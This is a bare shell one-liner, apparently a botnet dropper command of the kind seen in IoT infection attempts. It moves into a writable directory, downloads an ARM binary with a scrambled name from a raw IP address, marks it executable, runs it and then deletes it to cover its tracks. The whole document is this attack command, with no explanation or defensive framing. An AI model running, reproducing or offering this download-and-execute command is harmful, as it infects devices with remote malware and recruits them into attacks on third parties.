cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.249.52.21/armv4eb.fdfdsvgb; chmod +x armv4eb.fdfdsvgb; ./armv4eb.fdfdsvgb; rm -rf armv4eb.fdfdsvgb
